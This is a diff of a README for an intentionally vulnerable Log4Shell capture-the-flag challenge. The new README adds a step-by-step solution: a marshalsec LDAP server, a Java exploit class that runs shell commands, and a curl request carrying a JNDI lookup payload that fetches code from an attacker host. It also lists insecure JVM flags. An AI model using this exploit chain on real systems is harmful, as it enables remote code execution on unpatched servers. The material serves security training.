@@ -1,173 +1,318 @@
-# EscapeTheMatrix - Log4j CTF Challenge
+# 🎯 Escape The Matrix - Log4Shell CTF Challenge
 
-A complete full-stack CTF challenge demonstrating **Log4j JNDI Injection vulnerability (CVE-2021-44228)** with a modern React frontend and vulnerable Spring Boot backend.
+<div align="center">
 
-## Challenge Overview
+![Matrix Theme](https://img.shields.io/badge/Theme-Matrix-00ff00?style=for-the-badge)
+![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)
+![Category](https://img.shields.io/badge/Category-Web%20Exploitation-blue?style=for-the-badge)
+![CVE](https://img.shields.io/badge/CVE-2021--44228-red?style=for-the-badge)
 
-**EscapeTheMatrix** is a CTF WEB challenge that simulates a food search application vulnerable to Log4j exploitation. Participants must discover and extract the flag by exploiting
+**A CTF challenge featuring Log4j JNDI injection with a Matrix-themed frontend**
 
-### 🏁 Features:
-- **7 Hidden Flags(In a scalled version currently only RCE)** across different difficulty levels
-- **Multiple Extraction Methods** (Environment vars, System properties, RCE, etc.)
-- **Modern UI** with React frontend
-- **Realistic Vulnerability** using Log4j 2.14.1
-- **1,250 Total Points** available
+</div>
 
-## Quick Start
+---
 
-### Prerequisites
-- **Java 17+** (for Spring Boot backend)
-- **Maven 3.6+** (for building backend)
-- **Node.js 16+** (for React frontend)
-- **Python 3** (for HTTP server during exploitation)
+## 📖 Challenge Description
 
+> *"You find yourself trapped inside the Matrix. To escape, you must solve the puzzle hidden within the cascading code. Click through the sequence of encrypted GIFs to collect fragments that will reveal the path to freedom. But beware—the true exit lies deeper in the void..."*
 
-### A.1 Docker Setup
- To deploy the container, you'll first need to build the Docker image and then run it.
+**Escape The Matrix** is a web exploitation challenge that combines:
+- 🎨 **Immersive Matrix-themed UI** with WebGL rendering
+- 🔍 **Sequential puzzle mechanics** through GIF fragment collection
+- 💣 **Log4Shell (CVE-2021-44228)** vulnerability for RCE
+- 🎭 **Hidden attack vector** discoverable through DOM inspection
 
-   1. Build the Docker image:
+### Challenge Objectives:
+1. Interact with the Matrix UI and collect all 13 GIF fragments
+2. Extract and decode base64 fragments from response headers
+3. Discover the hidden vulnerable endpoint
+4. Exploit Log4j JNDI injection to achieve RCE
+5. Retrieve the flag from the server
 
-```bash
-    docker build -t EscapeTheMatrix .
-```
-      This command builds the Docker image from the Dockerfile in the current directory and tags it as EscapeTheMatrix.
+---
 
-   2. Run the Docker container:
-```bash
-     docker run -d -p 8080:8080 --name EscapeTheMatrix_app EscapeTheMatrix
-```
-      This command runs the EscapeTheMatrix image:
-       * -d: Runs the container in detached mode (in the background).
-       * -p 8080:8080: Maps port 8080 of your host to port 8080 inside the container, allowing you to access the application.
-       * --name EscapeTheMatrix_app: Assigns a name to your container for easier management.
-       * EscapeTheMatrix: The name of the image to run.
+## 🚀 Quick Start
 
-### 1. Start the Backend (Spring Boot)
+### 🐳 Docker Deployment (Recommended)
 
 ```bash
-cd server
-mvn spring-boot:run
+# Build the Docker image
+docker build -t escape-matrix .
+
+# Run the container
+docker run -d -p 8080:8080 --name escape-matrix-ctf escape-matrix
+
+# Access the challenge
+# Open http://localhost:8080 in your browser
 ```
 
-**Backend will run on:** `http://localhost:8080`
+### 🛠️ Manual Setup
 
-### 2. Start the Frontend (React)
+#### Prerequisites
+- **Java 8** (JDK 1.8)
+- **Maven 3.8+**
+- **Node.js 20+**
+- **Docker** (optional)
 
+#### Backend Setup
 ```bash
-cd frontend
-npm install
-npm run ctf
-```
-
-**Frontend will run on:** `http://localhost:5173`
-
-### 3. Open Your Browser
-
-Visit `http://localhost:5173` to access the EscapeTheMatrix search interface.
-
-## For CTF Participants
-
-### Challenge Endpoints:
-- **Search:** `http://localhost:8080/search?query=<input>` (via frontend)
-- **Login:** `http://localhost:8080/login?username=<input>` (direct access)
-- **Health:** `http://localhost:8080/health` (status check)
-
-### Getting Started:
-1. Use the search interface to test basic functionality
-2. Set up your exploitation environment (LDAP server, HTTP server)
-3. Begin testing JNDI injection payloads
-4. Extract flags using various techniques
-
-### Required Tools for Exploitation:
-- **marshalsec JAR** - For LDAP server
-- **Python HTTP server** - For serving exploit classes
-- **Custom Exploit.java** - For remote code execution
-
-##  Project Structure
-
-```
-EscapeTheMatrix/
-├── frontend/               # React application
-│   ├── src/
-│   │   ├── App.jsx        # Main search interface
-│   │   └── App.css        # Styling
-│   ├── package.json
-│   └── README.md
-├── server/                 # Spring Boot application
-│   ├── src/main/java/
-│   │   └── com/example/ctf/
-│   │       ├── Controllers/
-│   │       │   └── Endpoints.java     # Vulnerable endpoints
-│   │       ├── Config/
-│   │       │   └── CorsConfig.java    # CORS configuration
-│   │       └── EscapeTheMatrix.java    # Main application
-│   ├── src/main/resources/
-│   │   └── application.properties     # Contains hidden flags
-│   ├── pom.xml                        # Maven configuration (auto-vulnerable)
-│   ├── flag.txt                       # RCE target file
-│   ├── run-vulnerable.sh              # Alternative startup script
-│   ├── deploy-ctf.sh                  # Master deployment script
-│   ├── CTF-CHALLENGE-GUIDE.md         # Complete walkthrough
-│   └── CTF-EXPLOITATION-GUIDE.md      # Technical exploitation guide
-└── README.md              # This file
-```
-
-## 🔧 Deployment (For CTF Organizers)
-
-### Quick Deployment:
-```bash
-cd server
-./deploy-ctf.sh
-```
-
-### Manual Deployment:
-```bash
-# Backend
 cd server
 mvn clean package
 java -jar target/ctf-0.0.1-SNAPSHOT.jar
-
-# Frontend (separate terminal)
-cd frontend
-npm install
-npm run build
-npm run preview
 ```
 
-## 🎯 Flag Information
+#### Frontend Setup (Development)
+```bash
+cd frontend
+npm install
+npm run dev
+# Access at http://localhost:5173
+```
 
-### Total Flags: 7
-1. **Environment Variables** 
-2. **System Properties** 
-3. **Application Properties** 
-4. **Remote Code Execution** 
-5. **Secret Admin Endpoint** 
-6. **Bonus Base64** 
+---
 
+## 🎮 Challenge Walkthrough
 
-## Security Notes
+### Stage 1: Escape the Matrix 🟢
 
-**WARNING:** This application is **INTENTIONALLY VULNERABLE** for educational purposes.
+1. **Access the Application**
+   - Navigate to `http://localhost:8080`
+   - Observe the Matrix-themed UI with falling code
 
-- Only run in isolated/controlled environments
-- Never deploy in production
-- Contains Log4j 2.14.1 with JNDI injection vulnerability
-- JVM security bypasses are pre-configured
+2. **Collect GIF Fragments**
+   - Click the green "Escape Matrix" button
+   - Each click fetches a GIF and appends a fragment to the DOM
+   - **Key Discovery**: Open browser DevTools → Network tab
+   - Inspect response headers for each request
 
-## Vulnerability Details
+3. **Find the X-Matrix-Id Header**
+   ```
+   X-Matrix-Id: UE9TVCAvYXB...
+   ```
+   - This header contains a base64 fragment
+   - Collect all 13 fragments in order
 
-- **CVE:** CVE-2021-44228
-- **Component:** Log4j 2.14.1
-- **Attack Vector:** JNDI Injection via user input
-- **Impact:** Remote Code Execution, Information Disclosure
-- **Mitigation:** Upgrade to Log4j 2.17.0+ or apply workarounds
+4. **DOM Mutation Analysis**
+   - Inspect the `#matrix-card` element after each click
+   - Notice the ID attribute changes: `matrix-card.fragment1.fragment2...`
+   - Fragments are URL-safe base64 (- instead of +, _ instead of /)
 
-## Educational Goals
+### Stage 2: Decode the Path 🔵
 
-- Understand Log4j JNDI injection mechanics
-- Practice real-world exploitation techniques
-- Learn about environment variable extraction
-- Explore Java system property disclosure
-- Experience remote code execution scenarios
-- Understand modern application security issues
+1. **Extract All Fragments**
+   - Collect all 13 base64 fragments from `X-Matrix-Id` headers
+   - Concatenate them in order:
+   ```
+   UE9TVCAvYXBpL200dHIxeF9Fc2M0cDNkL2VuVDNyX3RoM192MGlEIENvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbiB7InRyNGMzIjoiLi4iLCJ2MGlkIjoiLi4iLCIzbnRyMHB5IjoiLi4iLCJuMGRFIjoiLi4ifQ==
+   ```
+
+2. **Base64 Decode**
+   ```bash
+   echo "UE9TVCAvYXBpL200dHIxeF9Fc2M0cDNkL2VuVDNyX3RoM192MGlEIENvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbiB7InRyNGMzIjoiLi4iLCJ2MGlkIjoiLi4iLCIzbnRyMHB5IjoiLi4iLCJuMGRFIjoiLi4ifQ==" | base64 -d
+   ```
+
+3. **Revealed Attack Vector**
+   ```
+   POST /api/m4tr1x_Esc4p3d/enT3r_th3_v0iD 
+   Content-Type: application/json 
+   {"tr4c3":"..","v0id":"..","3ntr0py":"..","n0dE":".."}
+   ```
+
+### Stage 3: Enter the Void 🔴
+
+1. **Test the Hidden Endpoint**
+   ```bash
+   curl -X POST 'http://localhost:8080/api/m4tr1x_Esc4p3d/enT3r_th3_v0iD' \
+     -H 'Content-Type: application/json' \
+     -d '{"tr4c3":"test","v0id":"test","3ntr0py":"test","n0dE":"test"}'
+   ```
+
+2. **Identify the Vulnerable Parameter**
+   - The `v0id` parameter is logged via Log4j
+   - Server uses Log4j 2.14.1 (vulnerable to CVE-2021-44228)
+
+3. **Exploit Log4Shell**
+
+   **Setup LDAP Server:**
+   ```bash
+   # Download marshalsec
+   git clone https://github.com/mbechler/marshalsec
+   cd marshalsec
+   mvn clean package -DskipTests
+   
+   # Start LDAP server
+   java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar \
+     marshalsec.jndi.LDAPRefServer \
+     "http://YOUR_IP:8000/#Exploit"
+   ```
+
+   **Create Exploit Class:**
+   ```java
+   // Exploit.java
+   public class Exploit {
+       static {
+           try {
+               Runtime.getRuntime().exec(new String[]{
+                   "/bin/sh", "-c",
+                   "cat /app/flag.txt > /tmp/flag && chmod 644 /tmp/flag"
+               });
+           } catch (Exception e) {
+               e.printStackTrace();
+           }
+       }
+   }
+   ```
+
+   **Compile and Serve:**
+   ```bash
+   javac Exploit.java
+   python3 -m http.server 8000
+   ```
+
+   **Trigger Exploit:**
+   ```bash
+   curl -X POST 'http://localhost:8080/api/m4tr1x_Esc4p3d/enT3r_th3_v0iD' \
+     -H 'Content-Type: application/json' \
+     -d '{"tr4c3":"test","v0id":"${jndi:ldap://YOUR_IP:1389/Exploit}","3ntr0py":"test","n0dE":"test"}'
+   ```
+
+4. **Retrieve the Flag**
+   ```bash
+   # Flag should be written to /tmp/flag or output via your exploit
+   ```
+
+---
+
+## 🏗️ Project Structure
+
+```
+Escape-The-Matrix/
+├── Dockerfile                    # Multi-stage Docker build
+├── flag.txt                      # Flag file (RCE target)
+├── README.md                     # This file
+│
+├── frontend/                     # React + Vite frontend
+│   ├── src/
+│   │   ├── App.jsx              # Matrix WebGL room
+│   │   ├── App.css              # Styling
+│   │   ├── main.jsx             # Entry point
+│   │   └── components/
+│   │       └── MatrixCard.jsx   # Sequential GIF UI
+│   ├── package.json
+│   └── vite.config.js
+│
+└── server/                       # Spring Boot backend
+    ├── pom.xml                   # Maven config (Log4j 2.14.1)
+    ├── assets/                   # 13 GIF files
+    ├── src/main/java/com/example/ctf/
+    │   ├── EscapeTheMatrix.java  # Main application
+    │   ├── Controllers/
+    │   │   └── MatrixController.java  # Vulnerable endpoint
+    │   └── Config/
+    │       ├── CorsConfig.java
+    │       └── StaticConfig.java # Blocks direct GIF access
+    └── src/main/resources/
+        ├── application.properties
+        └── log4j2.xml            # Log4j configuration
+```
+
+---
+
+## 🔐 Security Details
+
+### Vulnerability Information
+- **CVE**: CVE-2021-44228 (Log4Shell)
+- **Component**: Apache Log4j 2.14.1
+- **Attack Vector**: JNDI Injection via `v0id` parameter
+- **Impact**: Remote Code Execution (RCE)
+
+### Vulnerable Code
+```java
+// MatrixController.java (line 119)
+logger.error("Matrix void signal: {}", payload.getV0id());
+```
+
+### JVM Flags (Intentionally Insecure)
+```
+-Dlog4j2.formatMsgNoLookups=false
+-Dlog4j2.enableJndi=true
+-Dcom.sun.jndi.ldap.object.trustURLCodebase=true
+-Dcom.sun.jndi.rmi.object.trustURLCodebase=true
+```
+
+---
+
+## 🎯 Learning Objectives
+
+- ✅ Web application reconnaissance and endpoint discovery
+- ✅ HTTP header analysis and base64 encoding
+- ✅ DOM manipulation inspection
+- ✅ Log4j JNDI injection exploitation
+- ✅ LDAP server setup for exploit delivery
+- ✅ Java RCE payload development
+- ✅ CTF-style sequential puzzle solving
+
+---
+
+## 🔧 Configuration
+
+### Environment Variables
+```bash
+# Backend port (default: 8080)
+SERVER_PORT=8080
+
+# Log level
+LOGGING_LEVEL=WARN
+```
+
+### Flag Configuration
+Edit `flag.txt` to set your custom flag:
+```
+NSC{your_custom_flag_here}
+```
+
+---
+
+## 📚 Additional Resources
+
+- [Log4Shell Explained](https://www.lunasec.io/docs/blog/log4j-zero-day/)
+- [JNDI Injection](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
+- [Marshalsec Tool](https://github.com/mbechler/marshalsec)
+- [CVE-2021-44228 Details](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
+
+---
+
+## ⚠️ Disclaimer
+
+**This application is INTENTIONALLY VULNERABLE for educational purposes only.**
+
+- 🚫 **DO NOT** deploy in production environments
+- 🚫 **DO NOT** use on systems you don't own
+- ✅ **ONLY** use in isolated CTF/lab environments
+- ✅ **ALWAYS** run in Docker containers or VMs
+
+---
+
+## 👥 Credits
+
+- **Challenge Design**: [Your Name/Team]
+- **Matrix UI**: WebGL shader implementation
+- **Vulnerability**: CVE-2021-44228 (Log4Shell)
+
+---
+
+## 📝 License
+
+This project is for educational purposes only. Use responsibly.
+
+---
+
+<div align="center">
+
+**Ready to escape the Matrix? 🟢💊**
+
+*"There is no spoon... only JNDI lookups."*
+
+</div>
 
